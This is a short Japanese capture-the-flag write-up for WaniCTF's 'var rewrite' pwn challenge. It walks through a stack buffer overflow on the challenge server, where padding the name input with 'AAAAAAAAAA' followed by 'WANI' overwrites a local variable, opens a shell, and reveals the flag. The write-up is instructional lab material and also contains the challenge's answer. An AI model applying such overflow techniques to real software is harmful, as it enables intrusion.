# var rewrite:PWN:101pts
nc var.wanictf.org 9002  
- stackの仕組みを理解する必要があります。  
- ローカル変数はstackに積まれます。  
- ローカル変数を書き換えて下さい。  

使用ツール例  
- [netcat (nc)](https://github.com/wani-hackase/memo-setup-pwn-utils#netcat)  

セキュリティ保護  
- Partial RELocation ReadOnly (RELRO)  
- Smash Stack Protection (SSP)無効  
- No eXecute bit(NX)有効  
- Position Independent Executable (PIE)無効  

[pwn02](pwn02)　　　　[pwn02.c](pwn02.c)  

# Solution
stackの変数を書き換えればいいようだ。  
pwn02.cの以下に注目する。  
```c
~~~
    if (strncmp(target, "WANI", 4) == 0)
    {
        win();
    }
    else
    {
        printf("target = %s\n", target);
    }
~~~
```
変数をWANIにすればよい。  
stackが見える親切設計なのでパディングはすぐにわかる。  
```bash
$ nc var.wanictf.org 9002
What's your name?: AAAAAAAAAA
hello AAAAAAAAAA!
target =

***start stack dump***
0x7ffe6852dc00: 0x00007ffe6852dc20 <- rsp
0x7ffe6852dc08: 0x4141414141410790
0x7ffe6852dc10: 0x4b43410041414141
0x7ffe6852dc18: 0x0000000b00455341
0x7ffe6852dc20: 0x00007ffe6852dc30 <- rbp
0x7ffe6852dc28: 0x00000000004009b6 <- return address
***end stack dump***

What's your name?: AAAAAAAAAAAAAAA
hello AAAAAAAAAAAAAAA!
target = AAAAA

***start stack dump***
0x7ffe6852dc00: 0x00007ffe6852dc20 <- rsp
0x7ffe6852dc08: 0x4141414141410790
0x7ffe6852dc10: 0x4141414141414141
0x7ffe6852dc18: 0x0000001000450041
0x7ffe6852dc20: 0x00007ffe6852dc30 <- rbp
0x7ffe6852dc28: 0x00000000004009b6 <- return address
***end stack dump***

What's your name?: AAAAAAAAAAWANI
hello AAAAAAAAAAWANI!
Congratulation!
ls
chall
flag.txt
redir.sh
cat flag.txt
FLAG{1ets-1earn-stack-w1th-b0f-var1ab1e-rewr1te}
^C
```
flagが得られた。  

## FLAG{1ets-1earn-stack-w1th-b0f-var1ab1e-rewr1te}